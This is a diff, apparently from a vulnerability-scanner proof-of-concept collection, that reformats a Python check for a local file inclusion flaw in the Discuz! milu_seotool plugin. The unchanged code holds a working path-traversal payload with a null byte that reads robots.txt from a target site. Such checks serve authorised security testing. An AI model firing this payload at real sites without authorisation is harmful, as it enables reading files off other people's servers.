@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Discuz_0021' # 平台漏洞编号，留空
+    vuln_id = 'Discuz_0021'  # 平台漏洞编号，留空
     name = 'Discuz! milu_seotool插件 本地文件包含'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
+    type = VulnType.LFI  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         Discuz! milu_seotool插件 本地文件包含漏洞。   
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Discuz!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '4a1709ff-289f-43e4-bc03-0a0b0146b4dc'
@@ -31,14 +33,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/plugin.php?id=milu_seotool:sitemap&myac=../../robots.txt%00'
             verify_url = self.target + payload
             #code, head, res, errcode, _ = curl.curl(url)
             r = requests.get(verify_url)
 
             if r.status_code == 200 and "User-agent" in r.content:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
